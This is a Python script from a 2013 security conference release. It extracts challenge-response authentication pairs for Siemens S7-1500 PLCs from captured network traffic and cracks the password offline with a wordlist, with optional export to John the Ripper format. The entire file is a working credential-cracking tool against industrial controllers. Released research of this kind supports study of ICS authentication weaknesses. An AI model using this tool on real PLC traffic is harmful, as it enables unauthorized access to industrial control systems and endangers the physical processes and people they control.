#!/usr/bin/env python
# -*-mode: python; coding: UTF-8 -*-

"""
File: s7-1500_brute_offline.py
Desc: Offline password bruteforse based on challenge-response data, 
      extracted from auth traffic dump file for Siemens S7-1500 PLC's.
      IMPORTANT: traffic dump should contains only traffic between plc and hmi/pc/etc. filter dump file before parse

      Power of Community 2013 conference release. 

      Scapy required. Works on *nix and win* systems.
"""

__author__      = "Aleksandr Timorin"
__copyright__   = "Copyright 2013, Positive Technologies"
__license__     = "GNU GPL v3"
__version__     = "1.2"
__maintainer__  = "Aleksandr Timorin"
__email__       = "atimorin@gmail.com"
__status__      = "Development"

__2do__         = " grab some beer "

import sys
import hashlib
import hmac
import optparse

try:
    from scapy.all import *
except ImportError:
    print "please install scapy: http://www.secdev.org/projects/scapy/ "
    sys.exit()


def get_challenges_responses(pcap_file):
    # parse pcap file and extract (challenge, response, auth_result)

    result = {}
    challenge = ''
    response = '' 
    auth_result = ''

    for packet in rdpcap(pcap_file):
        try:
            payload = packet.load.encode('hex')
            #if payload[14:26]=='720200453200' and payload[46:52]=='100214' and abs(packet.len+14 - 138)<=1:
            if payload[14:20]=='720200' and payload[46:52]=='100214' and abs(packet.len+14 - 138)<=1:
                challenge = payload[52:92]
            #elif payload[14:26]=='720200663100' and payload[64:70]=='100214'  and abs(packet.len+14 - 171)<=1:
            elif payload[14:20]=='720200' and payload[64:70]=='100214'  and abs(packet.len+14 - 171)<=1:
                response = payload[70:110]

            if challenge and response:
                auth_result = 'unknown'
                result[challenge] = (response, auth_result)
                challenge = ''
                response = '' 
                auth_result = ''
        except:
            pass

    return result

def calculate_s7response(password, challenge):
    challenge = challenge.decode("hex")
    return hmac.new( hashlib.sha1(password).digest(), challenge, hashlib.sha1).hexdigest()

if __name__ == '__main__':
    print """
Offline password bruteforse based on challenge-response data, 
extracted from auth traffic dump file for Siemens S7-1500 PLC's.
IMPORTANT: traffic dump should contains only traffic between plc and hmi/pc/etc. filter dump file before parse

Power of Community 2013 conference release. 

Scapy required. Works on *nix and win* systems.
"""

    parser = optparse.OptionParser()
    parser.add_option('-p', '--pcap', dest="pcap_file", help="traffic dump file")
    parser.add_option('-w', '--wordlist', dest="wordlist_file", help="wordlist file")
    parser.add_option('-j', '--jtr', dest="jtr_file", help="john the ripper format export file")

    parser.print_help()
    raw_input("press <PoC2013> key to continue...")

    options, args = parser.parse_args()
    
    pcap_file = options.pcap_file
    wordlist_file = options.wordlist_file
    jtr_file = options.jtr_file
    # https://raw.github.com/kholia/JohnTheRipper/a7370d3b326789bbf9bc996fc7899957e8fba726/run/s7tojohn.py
    # jtr format: print "%s:$siemens-s7$%s$%s$%s" % (cfg_pcap_file, outcome, challenge, response)

    if not pcap_file:
        parser.print_help()
        sys.exit()

    
    print "[+] using pcap file: %s , wordlist file: %s" % (pcap_file, wordlist_file)
    result = get_challenges_responses(pcap_file)
    print "[+] found challenge-response:"
    for challenge in result.keys():
        response = result[challenge][0]
        auth_result = result[challenge][1]
        print "\tchallenge: %s response: %s auth result: %s" % (challenge, response, auth_result)
        if jtr_file:
            outcome = auth_result=='success' and 1 or 0
            open(jtr_file, 'a+').write('$siemens-s7$%d$%s$%s\n' % (outcome, challenge, response))


    if wordlist_file:
        print "[!] start password bruteforsing"
        for p in open(wordlist_file):
            p = p.strip('\n')
            if p:
                for challenge in result.keys():
                    response = result[challenge][0]
                    auth_result = result[challenge][1]
                    if response == calculate_s7response(p, challenge):
                        print "[+] found password: %s challenge: %s response: %s" % (p, challenge, response)
                        del result[challenge]

    print "[+] work done"



